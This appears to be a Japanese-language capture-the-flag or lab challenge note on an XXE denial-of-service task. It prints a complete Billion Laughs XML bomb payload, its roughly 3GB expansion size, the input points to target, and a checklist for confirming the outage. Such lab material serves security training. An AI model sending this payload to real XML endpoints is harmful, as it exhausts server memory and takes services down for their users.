# XXE DoS ❌

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** XXE (XML External Entity)
**目標:** Billion Laughs 攻撃で DoS を引き起こす

## ヒント

- **攻撃:** Billion Laughs (XML 爆弾)
- **原理:** エンティティの再帰的展開でメモリを枯渇
- **入力箇所:** XML を受け付けるエンドポイント

## Billion Laughs ペイロード

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## 展開サイズ

```
lol  = 3 bytes
lol2 = 30 bytes (10 × lol)
lol3 = 300 bytes (10 × lol2)
...
lol9 = 3 × 10^9 bytes ≈ 3GB
```

## 入力箇所

- `/#/complain` でのファイルアップロード
- API で XML を受け付けるエンドポイント

## 検証ポイント

- [ ] XML を受け付けるエンドポイントを特定
- [ ] Billion Laughs ペイロードを送信
- [ ] サーバーの応答遅延または DoS を確認

## 解説

[未着手]
